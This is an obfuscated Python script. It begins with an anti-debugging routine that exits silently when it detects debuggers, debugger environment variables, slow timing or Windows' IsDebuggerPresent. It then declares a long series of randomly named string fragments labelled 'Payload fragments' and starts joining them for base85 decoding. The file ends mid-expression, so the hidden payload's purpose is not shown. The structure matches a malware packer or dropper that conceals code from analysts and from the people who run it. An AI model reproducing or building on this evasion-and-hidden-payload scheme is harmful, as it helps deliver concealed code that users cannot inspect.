#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cpRo5YjexSBINp = 'mNQZ`g@qdSI21L=O4_!}9sdvZPvn)O#k*u-IsPeW{YM_Od(YM!H+v*U^`zhpNsMCO@-Cg!'
_coZaFsJbBETNBl = '4E;bz&Nl3pCWE3IsLrog?iQt<+<Rqot0)60NV(3|Re6V_)3*x5c9$IQkxB4D9IOHW%GP{B'
_cisS9lrkphhBUh = 'RdhST%<R6J71dTOGMS=q&4J8pi184j+zU(#OcyeBtX;fU#ce5%VBJog_*KPzio9n7->WYy'
_cleV_QcVEeZAuX = 'D^KULQGD7jq6~hjqF0I{S?1~x<C0=hK&kT?c(_sZK|tS5bZnOx0S&0qKw#+`lXCLLLdfx7'
_czaaVNABJXt_Gr = 'uAn$Ip;EjsiNurCF5Q57=aElDxMdfq@aWEpT4XGptti;KFP3)GSVSK*d@ZHR@ot8bb!KqF'
_cuxDjoLIAa6vM1 = 'a`@}s3vH20po-X0Brt{qr||z8NuttcC#b(io<295zbo*)IYx>rYB7buv2jZ77MrJ_P3=zd'
_ccSSy2UtueNrrU = 'h=zO59<b;A)EDaK{7nnkAuL#JS_r#5qL_Uo4%1|*^wY42v+$3Q7Yg2%vHxRr^7Dh9Qn|^q'
_cxome7JGsuWDF5 = 'Tw&GG{^L(x7ndgcxp-FQO(!=QX(MRQA0(IcBO(UD?%fG}fEcaXD)X2lsR8D55#pi>deU(C'
_crGPOE2GE3NNk0 = 'EJCV`_~~mAM+zAOQMj1Klso9u8@kkvf3C0DAnPLeOVgn~7^7*dN~FP9LPg55-Dvh*5SB)D'
_cdHT_Em6V7sWBb = 'W57*$mK&8^6ytiv00!UkYpXWcy)~5?i`hR1+XH;c+j`)(Idv@9JI-6NJ~WLahSAR$Z{7$2'
_cfCedvRIdoiAm7 = 'MH}*D<**=Sn=a!kc!f~=AfQy~9+ITU%VJB$9~P#}D(y$+O2=O)Fg1BDN7~8T_44)r?K}3h'
_canlBUW1LUyrhR = ')j?R^b$vRChBE;0wG`0TQy4K*vk1pLwS5#IbwL1GAqSfjQ2$MG2Bdg1L#2^m>i_s`5JGwZ'
_cdYO6GeJzJepQz = 'AJ~@zrdez!lkerwVT|8eEhej@b*Fz+neuAaHt2Pqld-P4K37<Ncvma5$d7;z<=m!#G9hQ0'
_crmn3ytk5i13Re = 'GppeCEG<uE><xwj*`NQ$nkKEkTJq0~?#Z#RU|(vk@yD1SU><fQs-3Mk#9^!JrSOupyUD`T'
_cdiF4OA5swwgaP = 'Wan=#Nb3@>0nO9`0W`t3sj-xW?IU<Ofpp7C)SF&)aV+~QZ)H=p;R?HnUc3Ng52B9P>JebU'
_cxq2AA79dEAsQ1 = 'p9TXOWxAFejcR7*J>D{bilNWOmH@lM0X|69F_ex;cK1GhytWA#Pe*ZH`3{4eMW5=8D*zz5'
_cyJfs8YqyhvhvD = 'FE#dKj9RCS%aW+<CwFpibSV*31ym}(u<W2Z1h2hXCzaxcgpGjqx*|Zl5YuIB0>`oDhfpTi'
_cxkDFFYctYrkgL = 'F`x>wiK+tc04r-sml1OCwb}}_pviFlrGjB~Bpa&Mjv^V=6nk^d)ragjX+~L$uv`QMMk24='
_ckvbrf0RpTlMuy = 'iw;+XVgpsbFplEkiVT8E!-r-4zjGn=F(UJh)yp62yHDV#V~Wum(?VA=l?nMix>qGBg?o@P'
_ceM2Et_tOXpXVv = ';skHJbLUg(=(!*)_sliBXMc)zi4QTnILjaRxg4u|Mk)<B$U@d;VmvM=Nic1*i86V@ny@x}'
_cduS67ZKLbHtyE = 'v^85a4p@~jv8lUPcfIIJYVNWSvca59&VN)r9(TOm2zkXFbXq<YJmnsKX>fsH0wH8j9Am-N'
_ceAZ2FQJM9FUx2 = 'sUWLf$iQY0D8U#pK&tB6clhtBj!dprL)=kqAysv{?c_fhC!LCK)pZEnW+R9L3u(9h?BaG4'
_cdbhelx6kOfPt7 = 'NSITKDksq|Ot=OTIvcaoDp7?GSONRmDC56~=|mDLr9^OKPOj`QPecy!ZblH7GrN3I>%tNR'
_ch3kgCFXIFEWZp = '0?8+^`r3Mtl;#gjAMGFm_)ZML@=5VurBD`2uoY)=Je4X&=W&&Qe)<M&71|>2<6cUAVpso&'
_coQcwFPusd9aGB = 'EicqMbNr)ZVV)%F_Q%YZGQ-P}PY)A;Qa}DtGb`LW7xK@j;fCm~)}v&m`~#`MY^yyS1iuxz'
_cec47oP4u0m1Wb = '41|?_8>cMRG^-~;9f-nJQy`I4zYL!()g9(BK{D^Y1gz=uV71qeb;`Eaj-RV&*^F))7>7^k'
_chYWxcR7F4iplE = 'y`nIJ*1HbJw|>@9tE98i2mAj)z`Gq4kN5Y3r;@d}Drsse#+5|uZ_+w?ZX+`AXW(yIs5j=0'
_cyf8KNsTrvw6hP = 'lm`L6B$@yw=zckQmsU>+*V5!&y5yGymT8#V`;%t4>N-t>4yzN-*Ry_^`nwq$go>vB-?(Jx'
_cpeOQrPiybZ6l0 = 'Dp`XcwT=SWkeh09N1l^JMv%cYSki%bGyib8U1A2C7_`Z9RGo?!P=#uK#Kvcm@g$cyzfgW|'
_c_tnDG7_dpBsgl = 'D^mVIfY4r)qzZKegSAE*x|aU(RiBm90N@CH8|xBx^0rc?kc<0naOnqcpBo7y;A2rC9~x?4'
_cnu97MQrAnIOoO = 'K}YiUKI}~O16t+vh*rak7%wO<@)Gm|EjGP0y>AE}$<c=O-57K6&7Bcvpnmd(U7K0VkyON-'
_cyoK7eHe32IMAA = 'k5vKN`DStUX~Q@fPMk<}#U_#ThT^ivY$t-(mq6kjP1aQuMF7@_r^xpZ*Ub8_h?Uzuaj;js'
_clTfQRGyEeRHpW = 'Q_NwRXfSh`Q~mtsh-k<~zVk*1``$RVfqkm&3Bje*p_Ta?;I^T33sCf+vW9a3ea2TU%}nl5'
_cvPBnVaN2nJcij = 'iPF1*ST+`A@|JO%kv+|1<6}B1!M)@SJ@ldY>%8rG6}>>FeXd@RcQ2&irEgVPWP>g33ZF{*'
_clvSgjR8fd5rZI = '4OAwdB-|dA6&C3e1OMuqsO8!~FScETm1&3ysVgP#ZRE{yLb&xtcAIu4b9by34ZXIi^l9>b'
_ctNiXXeNnRpr1G = '+K7Vc8=&&uweXyZ=Lz*F(%Ns%)jAu#y;|lQ_Y@^maUhUC24emVlow}@`p7Wf6H;jvpiSAF'
_ctGcxnPUBak3Q4 = 'l3@z&*1`ULr&7sO)+umk45Qh+xa)}Ag)W7XKY~Ee3+QXW-FcXn8Pj))YBx5`j(D4egPsyp'
_czQ50psXTummLJ = 'Zq3xskCbJ18i(Zk({5nkus`?4BeuU2QcvQL_l4m2{|>N5x+&D1UO*vP5j`wM-g7H6(;Sdm'
_cbQm389TCiOifZ = 'v;cgPkA;aS2H+F0&7DR1aGmBJ>y7J}yEAC9ZD!Z-q|?ImbLOng9Yzfyn#sVgX9s}}yPv%?'
_cyGGiD8Z4YJ_2K = 'a&sDzX_C1`J6((d_-jU?z&H;jSu(9+FwOH&e8UX<lA+h*VtUGi7_pHeuO6*X27&H#xtQ{l'
_cli4fvQUbpeKZd = 'bSDIS{lfweRkS3Y(`J`aUqFTh0ZW#T+7XU(Sq3{-v5$HZ7>w-up{UI9CGf#nrzs0qCO{^1'
_clgoNBKwpfxIxg = 'nl;>F;#G(YM%L9cw!f@W9iNrThnL)F^1uca4qOCuaLzo=(>>Sxw3{T>+PA8Yg%7cCs|f+5'
_cc4eqA995b3y3b = '0-|(AQ}|AV7EyWtyzE>=LTDhKN!=p&c|Z4Q_l)L>BP#VsqJxgoTd&LIQ`m56seJ^R`8*~p'
_cgngKseDVJwoMn = '>DN|e9`Vo2H^b&=n3Nz&gzzrr4m*s>nvs-(mV#=D_hK-dM1Mh=eLm5BhVBOn9Ixu{H!mJ('
_ccn4TI9oWhdesN = 'h7A?F?_Zo+opo~<b?)HN6rl&dI^RT&y#F{B5{!I_@3hcX)|vB5|BBD|Nc!K?(gdwaB2?j~'
_czW7Pc8ZzHtOG8 = 's7cztY1r$OpRZYy){6>$^zfl?*tWb*`R`42V1&JbeaP~5y3b!Rq8UQV10f;trDh;_$$gdN'
_ckMgiM3SHbBhLY = 'd#boFBDWz2w!C4KFx>1c+&7}~m;n5ifW)zqb+e7SN1Db3`2cQpPny;1v+QAd!CANRI-T-l'
_czGZaETVkMJcUH = '(l-Y4fW1Wz!BF8ED|9wOlaP`N>UW=8+vFs^lEZJLg7r8H!d%uI{sWGK>$l5QOK|a+ma$YO'
_cjANA0Fh1wFFSJ = '`DufRh4gkkcG4*YpIcAj-f2Odpe87Ro#(dteRmsxmsZ(qzuN{H2KgL<(b?m$d#-;_Uwl@u'
_cp4Ir2oo8AUdd8 = 'R^6-8Sk95imND9CJQY%a%S2x-Erm){=~vk~7|<-Q160Dhywh8IDBpT&-K>T23150ios*d2'
_cesKSUY_3kj2J6 = '8}wwE$%;)yAWf~RO8VpF??@%{_Fpn*g$CCabLG#1@gpZb`nd#uQ`lDK{lC8LSJG;0Cf1;2'
_cdFCZXxb43OnX6 = 'cAPRE{JDAbzYLtDmRX-Uj!&QJ3@d?ruD3To8o>haY>q#&A6?d+vE)dGJ65t9ieQF&qGYi7'
_cbhKXWxr1W3pZ2 = 'r^SV-k5+K4k$4IdFFZ>JUwTiysVgu^sPlj?^`(q0$dn!k1u|OL?BHBeFVMRXB!yC!DRmwv'
_ccSVpdGFWIH9FY = 'BcxVz38cpM$kaLqCjY_qOtoE;{W*Te6#D;vjKjkumL;Q7MLUsIUyT&728+i|g3p=(H%Z8N'
_cx3IxBH2gBHg_I = 'Y#UI%P)+sq7D!JB?(tD%i;uJ><C&~-X@^0|Sk?z$JSB_0Sqh4#I9&Cgv^=T>b0=b)&o)^s'
_cs3qKtyZIwiR75 = 'o+rernd^)8NuCTEur`SAj%q?#Rvbt05!jXf7N7)1Jt!h~e-2iChvOeAdU0Kv$Jk~35sy=j'
_ctVsjyeFzCjsap = 'a$}woe^s*pe9@Us;mmJDhM^*7m)|3B-b`x-F%#!1`fy+B^S$Aj?bz({DZjT6mAP@5b)p4L'
_cyMxPWdY5U3iYF = '@wZJHrEC&-VpQZ-xRWi7dGbgm+2=f^?NA^LR-*f`;C)M@SQgLJaznCd_^JgBB8BK6sw0h4'
_c_ZUl7Er1s3zvD = 'epXf&sgszY@S9YyrXtUtN<1&VPo!Y#_@cQaRmb~0$W+7mOpc)&Vz6!B^}MI6JY-drHnup|'
_cjorH1z7sCkest = '44dEEv@`9_x)k33vAbc*t#<1LYNN~dZoPSfr>=6SGmamYmeMVj&F-ErW{R;#D=D^j2t(RW'
_csbOGp5wnJdHLo = 'V)f>Xz(MxL1jmz>o9RDRptUuarjk-xgLMBQ#I>rOth8F`-Z(G#oylMQbRx6uvEg7BwSQlI'
_c_8MvH7rqn6SH1 = 'W8cLru?z-#e}T{8It+ti?1vhwkN@+c^Rg84KC=-PeaE!jsYRz5JP6p@vC{MoC3m}Iu;v^#'
_cqICJraN17pDWO = '4a&l1EW$gTI0p|!sh2!+1hdzO$GI+h!V8U_<$gDDO_i!NaO|Xr;A&7*Yofh{kNQqX-^)Lu'
_cl9G29hnQkhFei = '!jaq^5jkDQQ<}ie?6g`;j1JIYo?XUq?1!}Idt{d%WsjwNEC+!((`$OEIY0WSDivvss{0lc'
_cyIQA8stHb85iq = 'vJY`~VCp+L{r&?Z1$8L}R;8T3WdZU;Y^=wk*$xYWYIx}f028spZ--+_)$&eBEvMKWUIE=X'
_cg2UwSDmp42VVN = 'l1v@C_K-v^dXz`Fdn#WYAxywS1zlAW6Hv)UopS?@`N?oQe_Tfk1odU$aW4QUR8L~{*=>J8'
_cczVQOPDvDo_mA = 'BR15*xlvpi;lUbreruokM<MTmjUj;J^ZXLB4oM*{GHia1X}pFvE<NC^I30Xi$T&kcl1b!+'
_ck8rqRUXFJcKwO = ';@o4xE9sJ_|9gf~5Y6^MPJM>z9$6PnqO<Zbo$D<48ioZ|gcW&Xh!k(JXYjKwgV1UjE~fP3'
_co4GFx3vBXv1yt = 'D!?0XYlk8Nuum9#c$P=!KzPFa$oR`r{|u90`^hyNl>1ziEf7CrO!1Wi@;Vf2-E|<8qd=yo'
_coboH6Ak3IbWFg = 'jTKvRzzT$N6)BYUBTiQ&SC5|>l&fYSJM%RxD@{#uTk4HUI@`Z8upMQ)-Lbbe{mw3+)sao1'
_cwbv0p0ZdB1I3z = 'mgDD&g-s>D-@dS4`H=jha=SacJSm)svWAWw;@R61yqFoP)u?#-G)sFtgGP&#k}l+)WTpa='
_cnTwQ2b43tNZGD = '59vzKHYh}WP+|)}ob%<*o_Jb*g#h+nCGY(;WOYkGqEgoUHe*3k!g3N(G?0E&ZSLsx630Qh'
_cq_E4hd84kHcin = 'Y;Mday@@c><`la{(kUMNQxluk&yF`S+9A2c+PrR$zk#dMYF@qhr6zNv)vKIa0T$J+<jqtr'
_clxNqeXK3OkFqp = '>diPx*nf8X#6d%RV!g&#<M5;7wG6BNCZ_{Xo-`UoIH4M5frB<n1Sg^6mF95??O-H;bl42W'
_cxjWsIdTD5rxsf = 'eGrAr*xtR1eG~{F1K#S4zK73tld}ttmv)!<)p=0Wb+XqGK-tVDqJ1O)w`?F0N!H<^f>WW5'
_crTExTFEZ_r6GW = '`)4Fe=EUU5jtc3iSj%OuRwRS_z#G{ZQpg@&7FME(XV}XLtUU18ULzg959qU((OVe4Lnvmw'
_c_dDucSoWTT6Px = 'fVccW2eD+6sMdC`mRqGUM?tW~{a>MBc$gLvqN@!Y&_v679Jw_r@Y7>hysgp|>zWR0IcGTt'
_cyFg8eBRQEDIrd = 'i}<SI^gH$y7Gd{S2GyL~X_sYQH2~7>D<~1><2~<A__2B9MOeRwDH-N&hOYdLQcW8k4F_Kv'
_cfZuIDCZ2u0n8T = '9f5-7Ack>7JNa#7Gq{IdLNTrJg$@43ag-+!31cQDZD8|SR{k9bT%si+8aaVESjGY5jMLRg'
_cvyq4xt1RNxbNi = 'gudODWOH~kq%Lgc>vS<=urU`{@Fl6SZt<*g1I-pSxmVzcft@x<I`M`9lf4Zt_!{+I=>z|Y'
_ctTUK1XYsLG0ge = 'aOUnjf?vjb5o^GJEZ5;iEJLiNo&63LR13dA5K}1@G7r=Cj^~(jb2-OQL~d0Qgws3FR0_aN'
_cctNib7KGfe1F9 = 'bn9d-vJKpO@Tg62{;!;U4zYM~Ecvp76CiqW@}SUDXKZ6g&xeXv7%Yr{0UuU{-jpzirRm1Q'
_cyPz7RH9g_A9oe = 'R)jlas#xHTyD+*Ns(e!03-nZ_CStH3s=6X-5-tbR5QHHJ_1M&rgtn+u!})6>9FHZWH0-I%'
_cj6BanoHjNuN0g = 'r(uJ8OM7Ysfg#1A^-6R3Y^}wUfzKJZYCZNK+F2<`s2H)Lu8NNWw+_q<Y32OHyaK!T!(A7Q'
_cgWqEUp4g6EUAt = 't_Oh1fJ#-hs7(uotCmVeXq3M^)_w*eS5X4$DtxRe>160p8smaHVO}<QtZ9T{o|xjOQhktc'
_cuG9cJ5uipkxqr = '?~y%~KbQ9T&Ce&woQvB&lT*ds2xc_y<(bm~fE!jo^irV!9Yb!iGAq=K9EvM8pdP2)hBOk@'
_caDSZUGK0767Wi = 'pg)$-U*k$FOuOZ?ET2bRFCQTy7H|wHWai%XICAQ6p?@h8%t1W-v6!mzN;u83s-kvYJK#J)'
_caig0w1l1GaJK7 = 'KSOs##nP1i`p~|IsZz?;p?0T8s~D0r^#hbDUBK|7DTZLuO3z*lKeP7)0nvxR^PL(L9|Zb&'
_cf7wTSS586BIEb = 'A(UQTq_zp3(zmGmeB)C4ty|?1%L$T*^Pqs>(d)q><Hj*fn%Yz36cOFOFH~`PRt@j%E`Jp0'
_c_jfi1yvI3R1wm = 'b*sC`NteS0_G}GFqJ5p|=99R4mT1|!U0)EaD$Hh%IaXDwZp-K+`-f~?C%OWOi4{4;+3j?}'
_c_3jE7bQbfj9GH = '5{Ba>ow?lJ^l04^uVH03TxeS$O1f0E*2@;sEgP_REXan+?uxC_m?`+3a)xq+U#~%ItI6AM'
_czMZPQkj_OcIUR = '7el%oJQw}I_LH3Y?WsJ<>slTwdr+#!5{p8I8}Zh#3oEH&N-4*C81iq|1;R~(+<?I$pxNHS'
_cmeEEmOwruZ7Xz = 'X!TL{D=Bwkt6zahBW-O=-X3*IY4wvqz8>;LEa#_A-9>0|4Z^&GSVjk91b_R{M1@S6y^Gc2'
_cuyhF3Ney5MId8 = 'bB3Rk%B~1acGmOS5jp+&t7EzjE*X)@I2Ph_C6cthoNH(5Db(}B9RKcE^<o6FMBOINkq8sS'
_camVyMrD7a2HVX = '@<?h7ga$Vt(4dM`<P<8lmnbLLjYB-^eRGo6{+BlQP@hoz#?=IX=tKB(JG?g-sWuRiy9MNV'
_caXQAfAGD5owNJ = '`nS-I{FZSh;~dLAbn_&+@~}|5h7X`{dR>QZ3mABzl5xlU^IL-EVhuh%q9m2P{#o9xP+c#G'
_cwFdxJuJfVOzA4 = 'CuZto$D}CSXPpz?E`d**7oOPR)^qMZBOSiXSr|dmeTi!nh_cADesl(lUmW3t{KWk!MoPgD'
_csyTtAVyZ5SWcW = 'l=83nQUo?w)rz}IU!&zYmSK{hVZT1{$>E(~D>(@U04fOdg94TfX1ItMpMSaoyi#cGrX$)+'
_cqTnS_7FYFR9VG = 'Ws~x^sN*nglB791F6owOaElX{+;Riob)<Ud=sndO{8bZV+fLRN_mWPS(a=WzVCH?$*5mNF'
_coSgHFoMIQgCDn = '<QoN9rWSHSCy#`OJ_V-@r#J!|M!H1M6yh`#_}+JgAlms0Fd%+^P-1y6F05}_ntxkD4QteM'
_ci16C4xJD_1Tmg = '4$6!1IF{&bN<c0TH<2sTSl74S4H#dn$(EnPlVFrmx6hQ027GR{y3eYhv^`FdI~&!HCT_3+'
_cj_OINM_IMIu2A = 'cgv*YOLe7m(qipfs!*9I0}Uly>>_`_u+Ia5w6@p-kRG3Q4N%|*G%3>hcmHniRD_G4?y}|_'
_crHTNn4HGDcEFw = 'Pb=%jsryy@<0wK_ceYMPCaKlpbG6GfXug|W)3T988&~$7rgf&Q;@W49fr|TujX^JOsoD86'
_cnAM94hZfWlLOQ = '8mKYnBIc(2x5`)#w~gz$>LO)$IS0sZgEYFEfmUSh$oR|~r_1u}qsp{WWR|ZWPYC5R+xx!Y'
_cbyZXfZ3YJRJKt = 'uJXY)AbDPr=4iXihV94Tk$Cp=3}j&hoB#(O^EoK<L;kHvmdXOikBK!edjxo;Zk>~;u_`T3'
_ccLkJhsqz4PA60 = 'IuY*!$&cRC_+L8yak@gz-H`Cg>LC?bbW|l6b-t*8_uFr3Ho@Bq>l9gl^2l@IT`>!_9%A(@'
_cfwsw7c5qaVuUg = 'Gc|YkcUi0+$5hbc!qYLC6nU?JirvDZ!yZ{4=wvHh#$Qt+qf;}6R+Pw>DO#fI?)HyoExE_r'
_cpjbwjwQx2T_CN = 'oAHW-bZ`W}?8u-<##9<QczW;kr=~lQ_H2bBJ<F|uh%3pDyh*JA{A3-9)t&x{)c+{h0C22V'
_cwu1HaUvgWu1Yf = 'Jsb^J5siR0$&t3(YVqBx7uc%R-5a6GKH)LqWX=Ce4X26~e4Qcg1ARC_#O`<I(cCD0%ayy@'
_caJSc15g38dxXO = 'AMXz9r6bOaf>)oSOA$ad6G|X*7Ovv_y2+)Fz_;QNtBmwVeg)K{14#ZIQjpJh&IZ^AnjlU}'
_crORebu04HVPad = '@Vi&^<vSG<5Xn$0nL*DH05j0qb&wJMwK0>YVS{GC+L1f^yck0oW}ZuS(Xs)FZaF|_ulv(a'
_cyIGQ_2ah_irhF = 'O1Q$5B9>lU)jg5Z{nt<adrDteyHkt9&UYssHDCjv#oRHUJ#h#&n5p^Ta{q1)`n~tA9#n;N'
_ciEd_y0seh98PA = 'X3onVA!KoI;;s$WHsFFyBk^r1b#t;mg0N*0z62_;fx4E>RkGB$XxWC!|JpHE0lS*C6@Po<'
_cho4mF2HbSqQE6 = 'tD4EqGdaaig`SQ7684B0%`N#tqQ446@*nBLi_h!jyVk6i@`47!@*Oa!{aK6^8Hb`eQ&2v8'
_crpOTr2CzGEbfb = 'K4uI}#BU{4AkFQs6k4V@{SeIJ{I2c|N4?xI854}`f3pdT&I*nizveAZt&0eeL#}ZlTgrsI'
_ceAQqdddKrVfsh = ';N$*)`o7~GhiZA+`Gs~^R?}n6N-Cr|+`EkKM8^oF7GL_df2__$ip*Nzmn@`LlcM#^i@cVj'
_cxbzaJHeEh7G2F = '$pg0m3owb$Uu2o8$~6PlvLvzpJEwi262_E|L5|{g{Nd={WYrC$En99&O)9*WU@&g!tYDT!'
_cdFWdmsigvgkRs = 'sMaS+it|(&=BxenaSN{2upX6~Kyn^5Sn&a4W6JK>KR$wpXZz`Bx!Bo|D$-xq){LzV^lKQM'
_cdqlbTlrLfpA2e = 'n8MmL!IY}`(&vQ9UED~6we~{<w`6#Z=h*4GrSntcnAdfVc9TfnoF`wdf%Vm^Rsb8m@#8Y`'
_ciTNRW1KRzA1GA = 'Y{6kV*+x1bxrdL;CTYHUjn9+Co=5^x<zF_}Qj?-ym9^@Gxo;Zi#xwfm&!2leAyGy}IabFL'
_cmhDaSSb1PxfZI = 'y%UjOzSGCdQg+0=wPZJ&lJ2Xmt*d+xaskJP?v(h&qi!W+{2*q^b_ZER5VGsiz%;j+3tnf?'
_cmIyhoqikpeE4E = 'tOnF8&^mOe;vsTnGuwyc3uAy=I|lKj1OfiIfL8VN8oZz&p8w&Ros07a4$4?z3l{P?*Gr*Y'
_czzfh0wEQCxdM3 = '!lEcP6zp4(mzyqX2B0E*_Qt$R&@PyB{0ti)f4d#yQuXgskIHd{N9|*e-Q+5+9EZa0D5Bcz'
_cvBuFfT3zMxMMl = 'Q>Mq@bUC9OWDKLMeFqlCs&;C}G_=$mS$OB2z;!@~#5w}ak6W5(H#dBVSlll_4R#EtKd+Fr'
_ceu7cCc_wk1qxm = 'A{jZwd&*!*Uo&?~%AV9g_9GA3LkCqc&9f1>hRMvLBvD*n`)Z$6^91v}FXVF}MFD??syi5a'
_ck7WXtPpH8KLup = 'rWx4pwip^}0RWDHbRT%Syo|#$?<zKI?5Pf}R~ifUgG=w2dh48>qTrlCAzi&9x&W?QAkDOu'
_cwryxxzAd7jQM_ = 'E{$#!)dlJRFxbujXi4!ZtGY#e6O6>+PXx5%UbS9IF<R4IhRP>c1AySbIJnRfUDMFa2+sSW'
_crKsz_FwDVImWK = '4WBwhV<2BiSnDWCkWA0+)9$!vHzed(0xf$O-BDl}#Wfk6W#(&rAcV@JN>IJ-JI(toiOgs&'
_cg6TDyOMeFZmJD = 'HaEp#O>6pc6;zRnmENKZE=Cou#B+DS_)%bK0{I{R>QK)N>a1~LW<6fpFNxp#(mPb9NC|w>'
_csQLXHo4bsWuaN = '4r#&nK(CJ=)#E7K6hKB;wQ=cbbLEe|$Cr#)1SlMLp+rU8;hX|Bk>+a+b#nxhJ==h%CfCAq'
_czEwa5RTww9zEy = '9<8l0C;R+O^f6WN+&EJB7QJ?VLU!R!aXh9%xc(FOK?B}(tY901os48O2`H^<IQ^pPFe)1-'
_cih5iSkKKAYXTV = '$&dZ3ThOw<qQ#wCLPdx(6#U0YB?hbAMiT=v@al8dlsuLk8=jcdkCCK;(e@)t@?5UG84!h$'
_cwcmhOTXoFq1M8 = 'Gh7>*u>r}WtnSoTKzNYHAN{;lZW_IL!QBX06Hlg7#E4mCmCh~z+9j!9S^Dei&@2GIS0w~<'
_c_L8aHARlp_231 = '=qg*3k<^_L7@4ua7eDJ6@?$f|-DOn?Jn9o-;Hoh0CGv@k92&Ve0g^6d#Ry?oxVq-5+|nRN'
_c_d6B2cO1I1ZWb = 'cO1Nq3f$V^oBg)O_f19;$ZyD-i<(Gfti`oPT^36|!9%e->)}HLPB)W_xbR;JKJf<_y%E9@'
_cm36qj_Pcm3rBu = 'NWUi}-IyM1Y}JTL?l2vbpw8wc%FRY@eVsVb%W+1oZK4P*Otr?PpLx}svdY%a`;u4#OSE>7'
_cg7aIUoEP1Yt45 = 'She7mm5z5izadK+#kiks;nK79ORBVgLb3?=Hu6)=^Y##5Ldu}BMR;Xp3!m2Q%D*QA=9zU#'
_cgwOH_8r5YJBlf = '{>_jSpoaKPyW`ru<F(vEA5k3kA`x7mZ2i^AiPPs6JaW(A#F>cY`4=Ok!(kyYs6~2N%X_Zz'
_cqgw_b2XW8sRVl = '**Y8L9^6omaNv%N32)3me|v#i|H;#GQ<k!hD~eXsd5Z+_1juJFIFvNPYEc8T(x|#d-~>tY'
_cxpbbU0wEkRWhz = 'M0fYn+5zi>>>{L(jR{TO%e%|Qo|f&>)6k=R&WxGbL*ha?w9Sb~UsyQ(#l;bl716CsGmqC;'
_cayfjRvDcUWetp = 'w`?NYduRt?(%(xPv>Ixn^Ohrj9gU{6xU{e=mv*klB9wknmM~(`5ECJYT&q=A1(CZzoZ2lC'
_cx93IvbItAcjqy = 'c4uEfHjhY8898*GBc;^!brRP9gz?6)2?8qegjl|j{)+<rgbJB}#`}b#q1Aa)b(Y8Lfc_Qe'
_c_7oZKqI8g8Fj4 = 'n>*3z7?DLbb8?8wH9yYdmHSmy_|1|e6y2LX2Q!tthU23_=~%D<n|o@sumjd5C;wDKAjvL8'
_chMMEeLO6p5Kdo = 'EqOSkS_53wxcIa*0C=F<qfAtVeL%`B_JWQVRec;_BC`#GPDVFMKI&sWN?x!M4m&2)tL1bS'
_cjZgrhylIx96Ej = 'e)w-pJeg0C|9*Bd=i-siv_jmuet$}-Yj6^T+-)A2XhMewF&&@|B6g`>|E1>LW)<n#gA8Qj'
_cf7P8k2MtAVsGO = 'C9A7XmnfdvN0P?HZ%d@kpJogy4V=6OVpR_hZNPd+1~8bW4a+n|NH*z#00OX*A46p3l!Hhv'
_cv576_RXTxdaPF = '%M@VEwD=)pEMZ!2>V1wvEg<2IW1N}dR>O6`lNEe$$|fw~WnZJ$2a;R&Y8A*4%~6mBs4uZB'
_clqT5zE9Pt1BXQ = '3S7I{VP7Qj5vk?GawQ($>sJ)xqWHe?i;?he%svI>fqym<N@RG@Ul_y=;k!*Mmhbp?R^|v^'
_ct7DwTypN33Wq1 = 'tf$glEqx-!t+1LzVbJl9rR><uf45}<0e=FPoMPZE0&mijVw`c2PZT&uKWD%GdO#?;r%pWI'
_ct1GbIfhBUplgx = '0gg}=?%~8AKtUM+5sPL8H<~N9rkpgPXaH0~P==_sc*Cm^prSNO9(UB>'

_ptGWLcCqYzkxpp = __import__('base64').b85decode(_cpRo5YjexSBINp + _coZaFsJbBETNBl + _cisS9lrkphhBUh + _cleV_QcVEeZAuX + _czaaVNABJXt_Gr + _cuxDjoLIAa6vM1 + _ccSSy2UtueNrrU + _cxome7JGsuWDF5 + _crGPOE2GE3NNk0 + _cdHT_Em6V7sWBb + _cfCedvRIdoiAm7 + _canlBUW1LUyrhR + _cdYO6GeJzJepQz + _crmn3ytk5i13Re + _cdiF4OA5swwgaP + _cxq2AA79dEAsQ1 + _cyJfs8YqyhvhvD + _cxkDFFYctYrkgL + _ckvbrf0RpTlMuy + _ceM2Et_tOXpXVv + _cduS67ZKLbHtyE + _ceAZ2FQJM9FUx2 + _cdbhelx6kOfPt7 + _ch3kgCFXIFEWZp + _coQcwFPusd9aGB + _cec47oP4u0m1Wb + _chYWxcR7F4iplE + _cyf8KNsTrvw6hP + _cpeOQrPiybZ6l0 + _c_tnDG7_dpBsgl + _cnu97MQrAnIOoO + _cyoK7eHe32IMAA + _clTfQRGyEeRHpW + _cvPBnVaN2nJcij + _clvSgjR8fd5rZI + _ctNiXXeNnRpr1G + _ctGcxnPUBak3Q4 + _czQ50psXTummLJ + _cbQm389TCiOifZ + _cyGGiD8Z4YJ_2K + _cli4fvQUbpeKZd + _clgoNBKwpfxIxg + _cc4eqA995b3y3b + _cgngKseDVJwoMn + _ccn4TI9oWhdesN + _czW7Pc8ZzHtOG8 + _ckMgiM3SHbBhLY + _czGZaETVkMJcUH + _cjANA0Fh1wFFSJ + _cp4Ir2oo8AUdd8 + _cesKSUY_3kj2J6 + _cdFCZXxb43OnX6 + _cbhKXWxr1W3pZ2 + _ccSVpdGFWIH9FY + _cx3IxBH2gBHg_I + _cs3qKtyZIwiR75 + _ctVsjyeFzCjsap + _cyMxPWdY5U3iYF + _c_ZUl7Er1s3zvD + _cjorH1z7sCkest + _csbOGp5wnJdHLo + _c_8MvH7rqn6SH1 + _cqICJraN17pDWO + _cl9G29hnQkhFei + _cyIQA8stHb85iq + _cg2UwSDmp42VVN + _cczVQOPDvDo_mA + _ck8rqRUXFJcKwO + _co4GFx3vBXv1yt 